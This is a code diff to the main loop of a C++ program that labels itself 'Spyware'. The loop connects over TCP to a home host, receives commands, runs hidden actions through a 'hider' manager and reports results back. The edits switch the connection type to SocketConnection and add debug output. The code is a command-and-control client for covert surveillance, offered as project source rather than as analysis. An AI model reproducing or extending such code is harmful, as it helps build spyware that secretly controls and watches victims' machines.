@@ -1,6 +1,8 @@
 #include <iostream>
 
 #include "../Maneger/Connection.h"
+#include "../Maneger/SocketConnection.h"
+
 #include "../IncludeCPP/Status.h"
 
 #include "../Maneger/HiderManeger.h"
@@ -19,7 +21,7 @@ int initRun(std::shared_ptr<Connection> conn);
 
 #define DEBUG
 
-void loopIter(std::shared_ptr<Connection> conn, HiderManeger& hiderManeger, ContraptionAdmin& admin);
+void loopIter(std::shared_ptr<SocketConnection> conn, HiderManeger& hiderManeger, ContraptionAdmin& admin);
 
 
 int main() {
@@ -28,11 +30,11 @@ int main() {
     
     HiderManeger& hiderManeger = HiderManeger::getInstance();
     ContraptionAdmin admin;
-    std::shared_ptr<Connection> conn;
+    std::shared_ptr<SocketConnection> conn;
     
     sleep(2); // wait for python to start
 
-    if (Connection::connectTCP(HOME_HOST, PORT, conn) != SUCCSESS) {
+    if (SocketConnection::connectTCP(HOME_HOST, PORT, conn) != SUCCSESS) {
         exit(EXIT_FAILURE);
     }
     bool cont = true;
@@ -60,7 +62,7 @@ int initRun(std::shared_ptr<Connection> conn) {
 }
 
 
-void loopIter(std::shared_ptr<Connection> conn, HiderManeger& hiderManeger, ContraptionAdmin& admin)
+void loopIter(std::shared_ptr<SocketConnection> conn, HiderManeger& hiderManeger, ContraptionAdmin& admin)
 {
     command cmd;
 
@@ -84,7 +86,9 @@ void loopIter(std::shared_ptr<Connection> conn, HiderManeger& hiderManeger, Cont
         std::exit(EXIT_SUCCESS);
     
     case HIDER_SETUP:
+        std::cerr << "start  hider setup\n";
         stat = hiderManeger.setUpHider(cmd.strParam);
+        std::cerr << "finnsh  hider setup\n";
         break;
     }
 
@@ -92,7 +96,8 @@ void loopIter(std::shared_ptr<Connection> conn, HiderManeger& hiderManeger, Cont
         stat = hiderManeger.hiddenAction(cmd, conn);
     }
 
-    std::cerr << "Spyware:  Conn: res-" << stat << " response-\n" << strRes << std::endl;
+    conn->flushInput();
+    std::cerr << "Spyware:  Conn: res-" << stat << "\nresponse-" << strRes << std::endl;
     conn->sendResponce(stat, strRes);
     std::cerr << "responce sent" << std::endl;
 }
